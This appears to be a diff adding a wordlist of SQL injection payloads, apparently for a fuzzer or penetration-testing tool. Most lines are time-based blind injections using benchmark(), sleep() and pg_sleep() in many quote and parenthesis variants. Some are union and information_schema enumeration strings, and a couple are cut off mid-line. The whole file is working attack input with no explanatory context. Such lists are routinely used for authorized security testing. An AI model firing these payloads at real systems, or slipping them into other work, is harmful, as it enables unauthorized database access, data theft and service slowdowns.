@@ -1,0 +1,36 @@
+1 or benchmark(10000000,md5(1))#
+1) or benchmark(10000000,md5(1))#
+1)) or benchmark(10000000,md5(1))#
+1 or pg_sleep(__time__)
+1) or pg_sleep(__time__)
+1)) or pg_sleep(__time__)
+1 or sleep(__time__)#
+1) or sleep(__time__)#
+1)) or sleep(__time__)#
+and 1 in (select var from temp)
+benchmark(10000000,md5(1))#
+" or benchmark(10000000,md5(1))#
+") or benchmark(10000000,md5(1))#
+")) or benchmark(10000000,md5(1))#
+) or benchmark(10000000,md5(1))#
+)) or benchmark(10000000,md5(1))#
+or benchmark(10000000,md5(1))#
+" or pg_sleep(__time__)
+") or pg_sleep(__time__)
+")) or pg_sleep(__time__)
+) or pg_sleep(__time__)
+)) or pg_sleep(__time__)
+or pg_sleep(__time__)
+" or sleep(__time__)#
+") or sleep(__time__)="
+")) or sleep(__time__)="
+) or sleep(__time__)='
+)) or sleep(__time__)='
+or sleep(__time__)#
+or sleep(__time__)='
+pg_sleep(__time__)
+select * from information_schema.tables
+select name from syscolumns where id = (sele ...
+) union select * from information_schema.tables;
+union select * from users where login = char ...
+x' and 1=(select count(*) from tabname); 
